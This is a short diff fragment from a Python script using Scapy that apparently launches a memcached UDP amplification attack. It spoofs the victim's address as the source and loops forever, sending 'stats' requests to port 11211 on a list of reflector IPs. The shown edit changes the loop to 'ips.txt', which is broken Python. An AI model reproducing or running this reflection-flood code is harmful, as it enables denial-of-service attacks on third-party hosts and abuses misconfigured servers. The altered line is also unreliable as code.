@@ -10,7 +10,7 @@ print(f.readline())
 
 payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
 while True:
-    for ip in ips:
+    for ip in ips.txt:
         send(IP(src=target, dst=ip) / UDP(dport=11211) / Raw(load=payload), count=100, verbose=0)
 
 
